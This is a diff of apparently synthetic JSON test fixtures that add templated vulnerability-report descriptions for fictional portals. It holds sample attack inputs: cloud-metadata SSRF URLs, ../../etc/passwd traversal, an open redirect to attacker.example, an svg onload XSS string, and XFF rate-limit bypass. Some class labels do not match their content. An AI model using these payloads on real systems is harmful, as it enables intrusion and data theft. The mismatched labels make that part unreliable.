           "message": "Included additional payload variant covering alternate render path."
         }
-      ]
+      ],
+      "description": "A server-side fetch accepts attacker-controlled URLs without allowlist or private range blocking, enabling access to internal metadata/services.\n\n### Technical analysis\n- Vulnerability class: **Server-Side Request Forgery (SSRF)**\n- Affected target: `https://auth.arvenfels-kultur.foo/fetch`\n- Preconditions: authenticated user: unauthenticated; app version: Mobile 2025.09\n\n```bash\n# Demonstrative SSRF curl\ncurl -s 'https://api.example/foo?url=http://169.254.169.254/latest/meta-data/hostname'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- POST url=http://169.254.169.254/latest/meta-data/ to the import endpoint.\n- Observe internal metadata persisted in the created resource.\n\n### Recommendations\n- Enforce URL allowlists; block private and metadata ranges.\n- Resolve DNS server-side; use egress allowlists.\n- Use protocol allowlists (http/https only), size/timeouts.\n"
     },
     "triager": {
       "status": "accepted",
@@ -7962,7 +8023,8 @@
           "offset": "0h",
           "message": "Minimal PoC attached; scope limited to in-scope assets."
         }
-      ]
+      ],
+      "description": "The download endpoint authorizes by session only and does not verify ownership, allowing enumeration of other users' resources.\n\n### Technical analysis\n- Vulnerability class: **Insecure Direct Object Reference (IDOR)**\n- Affected target: `https://api.arvenfels-kultur.foo/statements/`\n- Preconditions: authenticated user: support agent; app version: API v2\n\n```http\nGET /api/files/12345 HTTP/1.1\nHost: victim.example\nCookie: session=...\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Request your own resource by ID.\n- Increment/decrement ID and observe cross-account access.\n\n### Recommendations\n- Authorize by object ownership on every read/write.\n- Use opaque identifiers; avoid incremental IDs.\n"
     },
     "triager": {
       "status": "accepted",
@@ -8110,7 +8172,8 @@
           "offset": "6d 16h",
           "message": "Re-tested on staging after patch; please confirm rollout window."
         }
-      ]
+      ],
+      "description": "A server-side fetch accepts attacker-controlled URLs without allowlist or private range blocking, enabling access to internal metadata/services.\n\n### Technical analysis\n- Vulnerability class: **Server-Side Request Forgery (SSRF)**\n- Affected target: `https://portal.arvenfels-kultur.foo/fetch`\n- Preconditions: authenticated user: authenticated user; app version: Service 1.8\n\n```bash\n# Demonstrative SSRF curl\ncurl -s 'https://api.example/foo?url=http://169.254.169.254/latest/meta-data/hostname'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- POST url=http://169.254.169.254/latest/meta-data/ to the import endpoint.\n- Observe internal metadata persisted in the created resource.\n\n### Recommendations\n- Enforce URL allowlists; block private and metadata ranges.\n- Resolve DNS server-side; use egress allowlists.\n- Use protocol allowlists (http/https only), size/timeouts.\n"
     },
     "triager": {
       "status": "accepted",
@@ -8230,7 +8293,8 @@
           "offset": "16h",
           "message": "Shared curl one-liner to help reproduce quickly."
         }
-      ]
+      ],
+      "description": "The API returns Access-Control-Allow-Origin: * with Access-Control-Allow-Credentials: true, allowing any origin to read responses with cookies.\n\n### Technical analysis\n- Vulnerability class: **Misconfigured CORS**\n- Affected target: `https://api.arvenfels-kultur.foo/api/me`\n- Preconditions: authenticated user: admin; app version: Auth 2025.09\n\n```http\nHTTP/1.1 200 OK\nAccess-Control-Allow-Origin: *\nAccess-Control-Allow-Credentials: true\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Host malicious page and fetch protected endpoint with credentials.\n- Observe successful JSON read in attacker origin.\n\n### Recommendations\n- Do not combine `Access-Control-Allow-Origin: *` with credentials.\n- Reflect only allowlisted origins; disable credentials unless necessary.\n"
     },
     "triager": {
       "status": "accepted",
@@ -8357,7 +8421,8 @@
           "offset": "5d 3h",
           "message": "Verified fix in Firefox and Safari; Chrome previously tested."
         }
-      ]
+      ],
+      "description": "The API returns Access-Control-Allow-Origin: * with Access-Control-Allow-Credentials: true, allowing any origin to read responses with cookies.\n\n### Technical analysis\n- Vulnerability class: **Misconfigured CORS**\n- Affected target: `https://portal.arvenfels-kultur.foo/api/me`\n- Preconditions: authenticated user: radiologist; app version: Service 1.8\n\n```http\nHTTP/1.1 200 OK\nAccess-Control-Allow-Origin: *\nAccess-Control-Allow-Credentials: true\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Host malicious page and fetch protected endpoint with credentials.\n- Observe successful JSON read in attacker origin.\n\n### Recommendations\n- Do not combine `Access-Control-Allow-Origin: *` with credentials.\n- Reflect only allowlisted origins; disable credentials unless necessary.\n"
     },
     "triager": {
       "status": "accepted",
@@ -8492,7 +8557,8 @@
           "offset": "7d 18h",
           "message": "Included additional payload variant covering alternate render path."
         }
-      ]
+      ],
+      "description": "User-provided content is persisted and rendered via an unsafe primitive in an admin-facing view, leading to JavaScript execution in a privileged context.\n\n### Technical analysis\n- Vulnerability class: **Security Misconfiguration**\n- Affected target: `https://api.arvenfels-kultur.foo/admin/queue`\n- Preconditions: authenticated user: citizen; app version: API v2\n\n```bash\n# Example probe\ncurl -i https://victim.example/endpoint\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Create object with payload in a display field (e.g., subject/memo).\n- Open the admin list/detail view and observe execution.\n\n### Recommendations\n- Validate and sanitize all user-controlled inputs.\n- Enforce allowlists and strict server-side validation.\n- Apply least-privilege and defense-in-depth (CSP, output encoding, parameterized APIs).\n"
     },
     "triager": {
       "status": "accepted",
@@ -8644,7 +8710,8 @@
           "offset": "3d 14h",
           "message": "Uploaded redacted logs illustrating server-side trace."
         }
-      ]
+      ],
+      "description": "The download endpoint authorizes by session only and does not verify ownership, allowing enumeration of other users' resources.\n\n### Technical analysis\n- Vulnerability class: **Insecure Direct Object Reference (IDOR)**\n- Affected target: `https://portal.arvenfels-kultur.foo/api/v2/documents/`\n- Preconditions: authenticated user: authenticated user; app version: Auth 2025.09\n\n```http\nGET /api/files/12345 HTTP/1.1\nHost: victim.example\nCookie: session=...\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Request your own resource by ID.\n- Increment/decrement ID and observe cross-account access.\n\n### Recommendations\n- Authorize by object ownership on every read/write.\n- Use opaque identifiers; avoid incremental IDs.\n"
     },
     "triager": {
       "status": "accepted",
@@ -8800,7 +8867,8 @@
           "offset": "5d 22h",
           "message": "Uploaded redacted logs illustrating server-side trace."
         }
-      ]
+      ],
+      "description": "User-provided content is persisted and rendered via an unsafe primitive in an admin-facing view, leading to JavaScript execution in a privileged context.\n\n### Technical analysis\n- Vulnerability class: **Security Misconfiguration**\n- Affected target: `https://portal.arvenfels-kultur.foo/admin/items`\n- Preconditions: authenticated user: unauthenticated; app version: API 2.3\n\n```bash\n# Example probe\ncurl -i https://victim.example/endpoint\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Create object with payload in a display field (e.g., subject/memo).\n- Open the admin list/detail view and observe execution.\n\n### Recommendations\n- Validate and sanitize all user-controlled inputs.\n- Enforce allowlists and strict server-side validation.\n- Apply least-privilege and defense-in-depth (CSP, output encoding, parameterized APIs).\n"
     },
     "triager": {
       "status": "accepted",
@@ -8936,7 +9004,8 @@
           "offset": "13h",
           "message": "Verified fix in Firefox and Safari; Chrome previously tested."
         }
-      ]
+      ],
+      "description": "A server-side fetch accepts attacker-controlled URLs without allowlist or private range blocking, enabling access to internal metadata/services.\n\n### Technical analysis\n- Vulnerability class: **Server-Side Request Forgery (SSRF)**\n- Affected target: `https://portal.arvenfels-kultur.foo/fetch`\n- Preconditions: authenticated user: unauthenticated; app version: Auth 2025.09\n\n```bash\n# Demonstrative SSRF curl\ncurl -s 'https://api.example/foo?url=http://169.254.169.254/latest/meta-data/hostname'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- POST url=http://169.254.169.254/latest/meta-data/ to the import endpoint.\n- Observe internal metadata persisted in the created resource.\n\n### Recommendations\n- Enforce URL allowlists; block private and metadata ranges.\n- Resolve DNS server-side; use egress allowlists.\n- Use protocol allowlists (http/https only), size/timeouts.\n"
     },
     "triager": {
       "status": "accepted",
@@ -9076,7 +9145,8 @@
           "offset": "1d 18h",
           "message": "Confirmed behavior on latest build; attaching version string."
         }
-      ]
+      ],
+      "description": "User-provided content is persisted and rendered via an unsafe primitive in an admin-facing view, leading to JavaScript execution in a privileged context.\n\n### Technical analysis\n- Vulnerability class: **Security Misconfiguration**\n- Affected target: `https://api.arvenfels-kultur.foo/admin/items`\n- Preconditions: authenticated user: unauthenticated; app version: Auth 2025.09\n\n```bash\n# Example probe\ncurl -i https://victim.example/endpoint\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Create object with payload in a display field (e.g., subject/memo).\n- Open the admin list/detail view and observe execution.\n\n### Recommendations\n- Validate and sanitize all user-controlled inputs.\n- Enforce allowlists and strict server-side validation.\n- Apply least-privilege and defense-in-depth (CSP, output encoding, parameterized APIs).\n"
     },
     "triager": {
       "status": "accepted",
@@ -9216,7 +9286,8 @@
           "offset": "5d 23h",
           "message": "Verified fix in Firefox and Safari; Chrome previously tested."
         }
-      ]
+      ],
+      "description": "A server-side fetch accepts attacker-controlled URLs without allowlist or private range blocking, enabling access to internal metadata/services.\n\n### Technical analysis\n- Vulnerability class: **Server-Side Request Forgery (SSRF)**\n- Affected target: `https://api.arvenfels-kultur.foo/api/import`\n- Preconditions: authenticated user: authenticated user; app version: API 2.3\n\n```bash\n# Demonstrative SSRF curl\ncurl -s 'https://api.example/foo?url=http://169.254.169.254/latest/meta-data/hostname'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- POST url=http://169.254.169.254/latest/meta-data/ to the import endpoint.\n- Observe internal metadata persisted in the created resource.\n\n### Recommendations\n- Enforce URL allowlists; block private and metadata ranges.\n- Resolve DNS server-side; use egress allowlists.\n- Use protocol allowlists (http/https only), size/timeouts.\n"
     },
     "triager": {
       "status": "accepted",
@@ -9352,7 +9423,8 @@
           "offset": "2d 17h",
           "message": "Shared minimal HTML page to demonstrate issue reliably."
         }
-      ]
+      ],
+      "description": "A server-side fetch accepts attacker-controlled URLs without allowlist or private range blocking, enabling access to internal metadata/services.\n\n### Technical analysis\n- Vulnerability class: **Server-Side Request Forgery (SSRF)**\n- Affected target: `https://portal.arvenfels-kultur.foo/import`\n- Preconditions: authenticated user: support agent; app version: API 2.3\n\n```bash\n# Demonstrative SSRF curl\ncurl -s 'https://api.example/foo?url=http://169.254.169.254/latest/meta-data/hostname'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- POST url=http://169.254.169.254/latest/meta-data/ to the import endpoint.\n- Observe internal metadata persisted in the created resource.\n\n### Recommendations\n- Enforce URL allowlists; block private and metadata ranges.\n- Resolve DNS server-side; use egress allowlists.\n- Use protocol allowlists (http/https only), size/timeouts.\n"
     },
     "triager": {
       "status": "accepted",
@@ -9507,7 +9579,8 @@
           "offset": "7d 2h",
           "message": "Added sanitized PoC variant to avoid external calls."
         }
-      ]
+      ],
+      "description": "A server-side fetch accepts attacker-controlled URLs without allowlist or private range blocking, enabling access to internal metadata/services.\n\n### Technical analysis\n- Vulnerability class: **Server-Side Request Forgery (SSRF)**\n- Affected target: `https://api.arvenfels-kultur.foo/import`\n- Preconditions: authenticated user: authenticated user; app version: Console 2025.09\n\n```bash\n# Demonstrative SSRF curl\ncurl -s 'https://api.example/foo?url=http://169.254.169.254/latest/meta-data/hostname'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- POST url=http://169.254.169.254/latest/meta-data/ to the import endpoint.\n- Observe internal metadata persisted in the created resource.\n\n### Recommendations\n- Enforce URL allowlists; block private and metadata ranges.\n- Resolve DNS server-side; use egress allowlists.\n- Use protocol allowlists (http/https only), size/timeouts.\n"
     },
     "triager": {
       "status": "accepted",
@@ -9679,7 +9752,8 @@
           "offset": "6d 6h",
           "message": "Added sanitized PoC variant to avoid external calls."
         }
-      ]
+      ],
+      "description": "A server-side fetch accepts attacker-controlled URLs without allowlist or private range blocking, enabling access to internal metadata/services.\n\n### Technical analysis\n- Vulnerability class: **Server-Side Request Forgery (SSRF)**\n- Affected target: `https://portal.arvenfels-kultur.foo/api/import`\n- Preconditions: authenticated user: authenticated user; app version: Console 2025.09\n\n```bash\n# Demonstrative SSRF curl\ncurl -s 'https://api.example/foo?url=http://169.254.169.254/latest/meta-data/hostname'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- POST url=http://169.254.169.254/latest/meta-data/ to the import endpoint.\n- Observe internal metadata persisted in the created resource.\n\n### Recommendations\n- Enforce URL allowlists; block private and metadata ranges.\n- Resolve DNS server-side; use egress allowlists.\n- Use protocol allowlists (http/https only), size/timeouts.\n"
     },
     "triager": {
       "status": "accepted",
@@ -9833,7 +9907,8 @@
           "offset": "7d 21h",
           "message": "Included additional payload variant covering alternate render path."
         }
-      ]
+      ],
+      "description": "A filename parameter is concatenated into a path without proper normalization, allowing traversal to system files.\n\n### Technical analysis\n- Vulnerability class: **Path Traversal**\n- Affected target: `https://portal.arvenfels-kultur.foo/support/logs?file=../../../../etc/passwd`\n- Preconditions: authenticated user: unauthenticated; app version: Auth 2025.09\n\n```bash\n# Accessing /etc/passwd via traversal\ncurl 'https://example/download?file=../../../../etc/passwd'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Request with file parameter using ../ traversal to system file.\n- Observe returned file content.\n\n### Recommendations\n- Normalize paths; reject `..` and absolute paths.\n- Enforce rooted directories and access checks by owner.\n- Use safe file APIs; avoid string concatenation.\n"
     },
     "triager": {
       "status": "accepted",
@@ -9952,7 +10027,8 @@
           "offset": "4d 15h",
           "message": "Verified fix in Firefox and Safari; Chrome previously tested."
         }
-      ]
+      ],
+      "description": "The login flow accepts external URLs in the returnUrl parameter, enabling phishing chains and potential token leakage.\n\n### Technical analysis\n- Vulnerability class: **Open Redirect**\n- Affected target: `https://api.arvenfels-kultur.foo/login?returnUrl=https://evil.foo`\n- Preconditions: authenticated user: radiologist; app version: Console 2025.09\n\n```http\nGET /login?returnUrl=https://attacker.example/collect HTTP/1.1\nHost: victim.example\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Open login with external returnUrl.\n- After authentication, observe 302 to attacker domain.\n\n### Recommendations\n- Validate `returnUrl` against a strict same-origin allowlist.\n- Use state/nonce; avoid reflecting external URLs.\n"
     },
     "triager": {
       "status": "accepted",
@@ -10115,7 +10191,8 @@
           "offset": "3d 8h",
           "message": "Shared minimal HTML page to demonstrate issue reliably."
         }
-      ]
+      ],
+      "description": "A filename parameter is concatenated into a path without proper normalization, allowing traversal to system files.\n\n### Technical analysis\n- Vulnerability class: **Path Traversal**\n- Affected target: `https://portal.arvenfels-kultur.foo/support/logs?file=../../../../etc/passwd`\n- Preconditions: authenticated user: support agent; app version: Service 1.8\n\n```bash\n# Accessing /etc/passwd via traversal\ncurl 'https://example/download?file=../../../../etc/passwd'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Request with file parameter using ../ traversal to system file.\n- Observe returned file content.\n\n### Recommendations\n- Normalize paths; reject `..` and absolute paths.\n- Enforce rooted directories and access checks by owner.\n- Use safe file APIs; avoid string concatenation.\n"
     },
     "triager": {
       "status": "accepted",
@@ -10251,7 +10328,8 @@
           "offset": "7d 18h",
           "message": "Uploaded redacted logs illustrating server-side trace."
         }
-      ]
+      ],
+      "description": "The API returns Access-Control-Allow-Origin: * with Access-Control-Allow-Credentials: true, allowing any origin to read responses with cookies.\n\n### Technical analysis\n- Vulnerability class: **Misconfigured CORS**\n- Affected target: `https://portal.arvenfels-kultur.foo/profile`\n- Preconditions: authenticated user: admin; app version: API 2.3\n\n```http\nHTTP/1.1 200 OK\nAccess-Control-Allow-Origin: *\nAccess-Control-Allow-Credentials: true\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Host malicious page and fetch protected endpoint with credentials.\n- Observe successful JSON read in attacker origin.\n\n### Recommendations\n- Do not combine `Access-Control-Allow-Origin: *` with credentials.\n- Reflect only allowlisted origins; disable credentials unless necessary.\n"
     },
     "triager": {
       "status": "accepted",
@@ -10395,7 +10473,8 @@
           "offset": "3d 13h",
           "message": "Confirmed behavior on latest build; attaching version string."
         }
-      ]
+      ],
+      "description": "The API returns Access-Control-Allow-Origin: * with Access-Control-Allow-Credentials: true, allowing any origin to read responses with cookies.\n\n### Technical analysis\n- Vulnerability class: **Misconfigured CORS**\n- Affected target: `https://api.arvenfels-kultur.foo/v2/me`\n- Preconditions: authenticated user: unauthenticated; app version: Auth 2025.09\n\n```http\nHTTP/1.1 200 OK\nAccess-Control-Allow-Origin: *\nAccess-Control-Allow-Credentials: true\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Host malicious page and fetch protected endpoint with credentials.\n- Observe successful JSON read in attacker origin.\n\n### Recommendations\n- Do not combine `Access-Control-Allow-Origin: *` with credentials.\n- Reflect only allowlisted origins; disable credentials unless necessary.\n"
     },
     "triager": {
       "status": "accepted",
@@ -10539,7 +10618,8 @@
           "offset": "3d 7h",
           "message": "Uploaded redacted logs illustrating server-side trace."
         }
-      ]
+      ],
+      "description": "A server-side fetch accepts attacker-controlled URLs without allowlist or private range blocking, enabling access to internal metadata/services.\n\n### Technical analysis\n- Vulnerability class: **Server-Side Request Forgery (SSRF)**\n- Affected target: `https://portal.arvenfels-kultur.foo/fetch`\n- Preconditions: authenticated user: unauthenticated; app version: Service 1.8\n\n```bash\n# Demonstrative SSRF curl\ncurl -s 'https://api.example/foo?url=http://169.254.169.254/latest/meta-data/hostname'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- POST url=http://169.254.169.254/latest/meta-data/ to the import endpoint.\n- Observe internal metadata persisted in the created resource.\n\n### Recommendations\n- Enforce URL allowlists; block private and metadata ranges.\n- Resolve DNS server-side; use egress allowlists.\n- Use protocol allowlists (http/https only), size/timeouts.\n"
     },
     "triager": {
       "status": "accepted",
@@ -10672,7 +10752,8 @@
           "offset": "5d 2h",
           "message": "Provided HAR with response headers and CSP for reference."
         }
-      ]
+      ],
+      "description": "The /metrics endpoint is publicly accessible and includes identifiers in labels, exposing sensitive metadata.\n\n### Technical analysis\n- Vulnerability class: **Server-Side Request Forgery (SSRF)**\n- Affected target: `https://portal.arvenfels-kultur.foo/metrics`\n- Preconditions: authenticated user: authenticated user; app version: Portal 2025.09\n\n```bash\n# Demonstrative SSRF curl\ncurl -s 'https://api.example/foo?url=http://169.254.169.254/latest/meta-data/hostname'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- GET /metrics and observe labels with identifiers.\n\n### Recommendations\n- Enforce URL allowlists; block private and metadata ranges.\n- Resolve DNS server-side; use egress allowlists.\n- Use protocol allowlists (http/https only), size/timeouts.\n"
     },
     "triager": {
       "status": "accepted",
@@ -10832,7 +10913,8 @@
           "offset": "8d 11h",
           "message": "Verified fix in Firefox and Safari; Chrome previously tested."
         }
-      ]
+      ],
+      "description": "The API returns Access-Control-Allow-Origin: * with Access-Control-Allow-Credentials: true, allowing any origin to read responses with cookies.\n\n### Technical analysis\n- Vulnerability class: **Misconfigured CORS**\n- Affected target: `https://api.arvenfels-kultur.foo/v2/me`\n- Preconditions: authenticated user: admin; app version: Console 2025.09\n\n```http\nHTTP/1.1 200 OK\nAccess-Control-Allow-Origin: *\nAccess-Control-Allow-Credentials: true\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Host malicious page and fetch protected endpoint with credentials.\n- Observe successful JSON read in attacker origin.\n\n### Recommendations\n- Do not combine `Access-Control-Allow-Origin: *` with credentials.\n- Reflect only allowlisted origins; disable credentials unless necessary.\n"
     },
     "triager": {
       "status": "accepted",
@@ -10988,7 +11070,8 @@
           "offset": "6d 11h",
           "message": "Uploaded redacted logs illustrating server-side trace."
         }
-      ]
+      ],
+      "description": "The login flow accepts external URLs in the returnUrl parameter, enabling phishing chains and potential token leakage.\n\n### Technical analysis\n- Vulnerability class: **Open Redirect**\n- Affected target: `https://portal.arvenfels-kultur.foo/login?returnUrl=https://evil.foo`\n- Preconditions: authenticated user: unauthenticated; app version: API v2\n\n```http\nGET /login?returnUrl=https://attacker.example/collect HTTP/1.1\nHost: victim.example\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Open login with external returnUrl.\n- After authentication, observe 302 to attacker domain.\n\n### Recommendations\n- Validate `returnUrl` against a strict same-origin allowlist.\n- Use state/nonce; avoid reflecting external URLs.\n"
     },
     "triager": {
       "status": "accepted",
@@ -11128,7 +11211,8 @@
           "offset": "0h",
           "message": "Initial submission with PoC and reproduction steps."
         }
-      ]
+      ],
+      "description": "A server-side fetch accepts attacker-controlled URLs without allowlist or private range blocking, enabling access to internal metadata/services.\n\n### Technical analysis\n- Vulnerability class: **Server-Side Request Forgery (SSRF)**\n- Affected target: `https://portal.arvenfels-kultur.foo/fetch`\n- Preconditions: authenticated user: radiologist; app version: Portal 2025.09\n\n```bash\n# Demonstrative SSRF curl\ncurl -s 'https://api.example/foo?url=http://169.254.169.254/latest/meta-data/hostname'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- POST url=http://169.254.169.254/latest/meta-data/ to the import endpoint.\n- Observe internal metadata persisted in the created resource.\n\n### Recommendations\n- Enforce URL allowlists; block private and metadata ranges.\n- Resolve DNS server-side; use egress allowlists.\n- Use protocol allowlists (http/https only), size/timeouts.\n"
     },
     "triager": {
       "status": "accepted",
diff --git a/fixtures/reports/kanton_eichenwald_reports.json b/fixtures/reports/kanton_eichenwald_reports.json
index e68dcbe..cfa6cc9 100644
--- a/fixtures/reports/kanton_eichenwald_reports.json
+++ b/fixtures/reports/kanton_eichenwald_reports.json
@@ -61,7 +61,8 @@
           "offset": "3d 19h",
           "message": "Included additional payload variant covering alternate render path."
         }
-      ]
+      ],
+      "description": "Subject field in citizen portal messages is stored and rendered without encoding in the admin inbox list, executing attacker-controlled JS.\n\n### Technical analysis\n- Vulnerability class: **Security Misconfiguration**\n- Affected target: `https://portal.eichenwald-digital.foo/messages/new`\n- Preconditions: authenticated user: citizen user; app version: Portal 2025.09\n\n```bash\n# Example probe\ncurl -i https://victim.example/endpoint\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Send a message with subject <svg onload=alert(1)>.\n- Admin opens inbox; alert executes.\n\n### Recommendations\n- Validate and sanitize all user-controlled inputs.\n- Enforce allowlists and strict server-side validation.\n- Apply least-privilege and defense-in-depth (CSP, output encoding, parameterized APIs).\n"
     },
     "triager": {
       "status": "accepted",
@@ -201,7 +202,8 @@
           "offset": "1d 17h",
           "message": "Shared curl one-liner to help reproduce quickly."
         }
-      ]
+      ],
+      "description": "The endpoint GET /api/documents/{id} lacks ownership checks, allowing enumeration of PDFs across users.\n\n### Technical analysis\n- Vulnerability class: **Security Misconfiguration**\n- Affected target: `https://api.eichenwald-digital.foo/api/documents/`\n- Preconditions: authenticated user: authenticated citizen; app version: API 1.8\n\n```bash\n# Example probe\ncurl -i https://victim.example/endpoint\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Download own PDF.\n- Increment ID to fetch others' documents.\n\n### Recommendations\n- Validate and sanitize all user-controlled inputs.\n- Enforce allowlists and strict server-side validation.\n- Apply least-privilege and defense-in-depth (CSP, output encoding, parameterized APIs).\n"
     },
     "triager": {
       "status": "accepted",
@@ -311,7 +313,8 @@
           "offset": "1d 14h",
           "message": "Re-tested on staging after patch; please confirm rollout window."
         }
-      ]
+      ],
+      "description": "The returnUrl parameter accepts external URLs, causing redirect after login to attacker site.\n\n### Technical analysis\n- Vulnerability class: **Open Redirect**\n- Affected target: `https://portal.eichenwald-digital.foo/login?returnUrl=https://evil.foo`\n- Preconditions: authenticated user: citizen; app version: Portal 2025.09\n\n```http\nGET /login?returnUrl=https://attacker.example/collect HTTP/1.1\nHost: victim.example\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Open login with external returnUrl.\n- After login, redirection happens to external domain.\n\n### Recommendations\n- Validate `returnUrl` against a strict same-origin allowlist.\n- Use state/nonce; avoid reflecting external URLs.\n"
     },
     "triager": {
       "status": "accepted",
@@ -473,7 +476,8 @@
           "offset": "2d 18h",
           "message": "Shared minimal HTML page to demonstrate issue reliably."
         }
-      ]
+      ],
+      "description": "The API responds with Access-Control-Allow-Origin: * and Access-Control-Allow-Credentials: true, permitting cross-site reads with cookies.\n\n### Technical analysis\n- Vulnerability class: **Misconfigured CORS**\n- Affected target: `https://api.eichenwald-digital.foo`\n- Preconditions: authenticated user: victim; app version: API 1.8\n\n```http\nHTTP/1.1 200 OK\nAccess-Control-Allow-Origin: *\nAccess-Control-Allow-Credentials: true\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Host page that fetches /api/me with credentials.\n- Observe successful response in attacker origin.\n\n### Recommendations\n- Do not combine `Access-Control-Allow-Origin: *` with credentials.\n- Reflect only allowlisted origins; disable credentials unless necessary.\n"
     },
     "triager": {
       "status": "accepted",
@@ -586,7 +590,8 @@
           "offset": "3d 10h",
           "message": "Shared minimal HTML page to demonstrate issue reliably."
         }
-      ]
+      ],
+      "description": "OTP verification endpoint enforces per-IP limits but trusts XFF header, allowing bypass by rotating values.\n\n### Technical analysis\n- Vulnerability class: **Security Misconfiguration**\n- Affected target: `https://portal.eichenwald-digital.foo/otp/verify`\n- Preconditions: authenticated user: attacker; app version: Portal 2025.09\n\n```bash\n# Example probe\ncurl -i https://victim.example/endpoint\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Attempt many OTPs with different XFF; no 429 returned.\n\n### Recommendations\n- Validate and sanitize all user-controlled inputs.\n- Enforce allowlists and strict server-side validation.\n- Apply least-privilege and defense-in-depth (CSP, output encoding, parameterized APIs).\n"
     },
     "triager": {
       "status": "accepted",
@@ -708,7 +713,8 @@
           "offset": "2d 8h",
           "message": "Added sanitized PoC variant to avoid external calls."
         }
-      ]
+      ],
+      "description": "Import endpoint fetches documents by URL without allowlist; internal IPs accessible.\n\n### Technical analysis\n- Vulnerability class: **Security Misconfiguration**\n- Affected target: `https://api.eichenwald-digital.foo/api/import`\n- Preconditions: authenticated user: authenticated citizen; app version: API 1.8\n\n```bash\n# Example probe\ncurl -i https://victim.example/endpoint\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- POST {url: 'http://169.254.169.254/latest/meta-data/'}\n- Service inlines response into stored document.\n\n### Recommendations\n- Validate and sanitize all user-controlled inputs.\n- Enforce allowlists and strict server-side validation.\n- Apply least-privilege and defense-in-depth (CSP, output encoding, parameterized APIs).\n"
     },
     "triager": {
       "status": "accepted",
@@ -846,7 +852,8 @@
           "offset": "11d 1h",
           "message": "Verified fix in Firefox and Safari; Chrome previously tested."
         }
-      ]
+      ],
